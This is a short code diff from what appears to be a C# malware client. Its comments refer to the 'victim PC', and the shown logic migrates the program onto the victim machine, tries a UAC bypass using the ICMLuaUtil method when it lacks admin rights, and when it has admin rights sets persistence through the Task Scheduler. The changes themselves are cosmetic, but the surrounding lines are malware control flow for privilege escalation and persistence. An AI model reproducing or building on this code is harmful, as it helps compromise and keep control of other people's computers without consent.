@@ -20,13 +20,15 @@ namespace Client
             CheckRealApplication();
 
             /// Check if Application is already on victim PC.
-            if (!Constants.IsInVictimPC()) Migrate();
+            if (!Constants.IsInVictimPC()) 
+                Migrate();
 
             /// Attempt to be God.
             if (!Constants.IsAdmin())
                 Armitage.UAC.UACBypass.QuickStart(Armitage.UAC.UACMethods.ICMLuaUtil);
             else
             {
+                /// Things to do when admin.
                 Armitage.Startup.ViaTaskScheduler();
                 ProtectTheLetter();
             }
